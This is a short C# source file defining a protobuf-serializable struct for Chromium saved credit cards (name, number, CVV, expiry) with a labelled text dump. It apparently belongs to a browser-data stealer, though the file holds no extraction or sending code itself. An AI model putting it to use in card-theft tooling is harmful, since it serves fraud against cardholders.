

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct ChromiumCreditCard
	{
		[ProtoMember(1)]
		public string cardholderName;
		[ProtoMember(2)]
		public string cardNumber;
		[ProtoMember(3)]
		public string cvv;
		[ProtoMember(4)]
		public int expirationMonth;
		[ProtoMember(5)]
		public int expirationYear;

		public ChromiumCreditCard(
		    string _cardholderName,
		    string _cardNumber,
		    string _cvv,
		    int _expirationMonth,
		    int _expirationYear)
		{
			this.cardholderName = _cardholderName;
			this.cardNumber = _cardNumber;
			this.cvv = _cvv;
			this.expirationMonth = _expirationMonth;
			this.expirationYear = _expirationYear;
		}

		public override string ToString()
		{
			return "CARDHOLDER_NAME: " + this.cardholderName + Environment.NewLine + "CARD_NUMBER: " + this.cardNumber + Environment.NewLine + "CVV: " + this.cvv + Environment.NewLine + "EXPIRATION_MONTH: " + this.expirationMonth.ToString() + Environment.NewLine + "EXPIRATION_YEAR: " + this.expirationYear.ToString();
		}
	}
}